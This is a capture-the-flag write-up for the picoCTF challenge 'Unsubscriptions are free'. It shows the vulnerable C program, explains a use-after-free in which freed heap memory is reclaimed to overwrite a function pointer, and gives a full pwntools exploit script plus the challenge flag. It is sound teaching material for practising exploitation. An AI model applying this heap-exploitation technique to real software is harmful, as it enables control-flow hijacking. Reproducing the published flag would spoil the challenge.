# Writeup - Unsubscriptions are free
Category: Binary Exploitation, Points: 100


## Descpriton
> Check out my new video-game and spaghetti-eating streaming channel on Twixer! 


## Vulnerability

Given the source code:
```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
  uintptr_t (*whatToDo)();
  char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

char * getsline(void) {
  getchar();
  char * line = malloc(100), * linep = line;
  size_t lenmax = 100, len = lenmax;
  int c;
  if(line == NULL)
    return NULL;
  for(;;) {
    c = fgetc(stdin);
    if(c == EOF)
      break;
    if(--len == 0) {
      len = lenmax;
      char * linen = realloc(linep, lenmax *= 2);

      if(linen == NULL) {
        free(linep);
        return NULL;
      }
      line = linen + (line - linep);
      linep = linen;
    }

    if((*line++ = c) == '\n')
      break;
  }
  *line = '\0';
  return linep;
}

void doProcess(cmd* obj) {
  (*obj->whatToDo)();
}

void s(){
  printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
  puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}

void m(){
  puts("Account created.");
}

void leaveMessage(){
  puts("I only read premium member messages but you can ");
  puts("try anyways:");
  char* msg = (char*)malloc(8);
  read(0, msg, 8);
}

void i(){
  char response;
  puts("You're leaving already(Y/N)?");
  scanf(" %c", &response);
  if(toupper(response)=='Y'){
    puts("Bye!");
    free(user);
  }else{
    puts("Ok. Get premium membership please!");
  }
}

void printMenu(){
  puts("Welcome to my stream! ^W^");
  puts("==========================");
  puts("(S)ubscribe to my channel");
  puts("(I)nquire about account deletion");
  puts("(M)ake an Twixer account");
  puts("(P)ay for premium membership");
  puts("(l)eave a message(with or without logging in)");
  puts("(e)xit");
}

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
    case 'S':
      if(user){
        user->whatToDo = (void*)s;
      }else{
        puts("Not logged in!");
      }
      break;
    case 'P':
      user->whatToDo = (void*)p;
      break;
    case 'I':
      user->whatToDo = (void*)i;
      break;
    case 'M':
      user->whatToDo = (void*)m;
      puts("===========================");
      puts("Registration: Welcome to Twixer!");
      puts("Enter your username: ");
      user->username = getsline();
      break;
    case 'L':
      leaveMessage();
      break;
    case 'E':
      exit(0);
    default:
      puts("Invalid option!");
      exit(1);
      break;
  }
}

int main(){
  setbuf(stdout, NULL);
  user = (cmd *)malloc(sizeof(user));
  while(1){
    printMenu();
    processInput();
    //if(user){
    doProcess(user);
    //}
  }
  return 0;
}
```

Let's look at the `main` function. It `malloc`s and returns a `user` pointer. Then the while loop runs 3 functions. `printMenu`, `processInput` and `doProcess`. `processInput` asks the user to input a single char, and then changes the value of `user->whatToDo` to the corresponding function, except for the letter `l`. For `l` it simply calls the function `leaveMessage` which `malloc`s 8 bytes and returns the `msg` pointer. Data is then `read` into `msg`.

For context, the `i` function essentially `free`s the `user`. If the `user` wishes to delete their account.

So far so good.

Now there is a function called `hahaexploitgobrrr` which `puts` the `flag` into `stdout`. Ideally we would want to call this function. How do we do that?

Notice, when the letter `S` is hit we get the output `OOP! Memory leak...0x80487d6`, The address of the function `hahaexploitgobrrr`.

Notice that `doProcess` essentially calls a function. Like so

```c
void doProcess(cmd* obj) {
  (*obj->whatToDo)(); // * dereferences the obj->whatToDo function's address
}
```

We want `doProcess` to call `hahaexploitgobrrr` with its address.

```c
//what we want the code to do..
void doProcess(cmd* obj) {
  ("0x80487d6")(); // 0x80487d6 is hahaexploitgobrrr's address
}
```

How do we do that? 

The input to the `doProcess` is the `user` pointer so if we can get control over `user` pointer we can overwrite it with `hahaexploitgobrrr`s address. Then calling `doProcess` would call `hahaexploitgobrrr`. printing the `flag`.


## Exploit

The plan:

1. We hit `S` to get the address of `hahaexploitgobrrr`.
2. We hit `I` to delete the account. Essentially `free`ing `user`. This will put the `user`s pointer into the `tcache` bin.
3. We hit `l` to call the function `leaveMessage`. This function will call `malloc` which will return `tcache`s first entry i.e. the `user`s pointer.
4. Input the address of `hahaexploitgobrrr`. This will overwrite the contents of `user` pointer with the functions address.

After the following steps `doProcess` will call `hahaexploitgobrrr` and print the flag.

The exploit:

```python
import sys

from pwn import *
from enum import Enum

class Commands(Enum):
  SUBSCRIBE       = "S"
  DELETE_ACCOUNT  = "I"
  CREATE_ACCOUNT  = "M"
  PAY             = "P"
  LEAVE_MESSAGE   = "L"
  EXIT            = "E"

def send_command(command):
  io.recvuntil("(e)xit\n")
  io.sendline(command.value)

def subscribe():
  log.info("Subscribing")
  memleak_line = "OOP! Memory leak..."

  send_command(Commands.SUBSCRIBE)
  line = io.recvlineS()
  if line == "Not logged in!":
    return None
  elif memleak_line in line:
    addr = int(line.replace(memleak_line, "").strip(), 16)
    log.info("Leaked address: {}".format(hex(addr)))
    io.recvline()
    return addr
  else:
    raise RuntimeError(f"Unexpected output during subscription: {line}")

def delete_account():
  log.info("Deleting account")

  send_command(Commands.DELETE_ACCOUNT)
  io.sendlineafter("You're leaving already(Y/N)?\n", "Y")
  io.recvline()

def leave_message(msg):
  log.info("Leaving message:\n{}".format(hexdump(msg)))
  send_command(Commands.LEAVE_MESSAGE)
  io.sendlineafter("try anyways:\n", msg)

def exit():
  log.info("Exiting")
  send_command(Commands.EXIT)

io = remote("mercury.picoctf.net", 4504) if sys.argv[1] == "remote" else ELF("./vuln").process()

hahaexploitgobrrr_addr = subscribe()
delete_account()
payload = p32(hahaexploitgobrrr_addr)
leave_message(payload)
log.success(io.recvlineS())
exit()
```


## Flag
`picoCTF{d0ubl3_j30p4rdy_4245f637}`

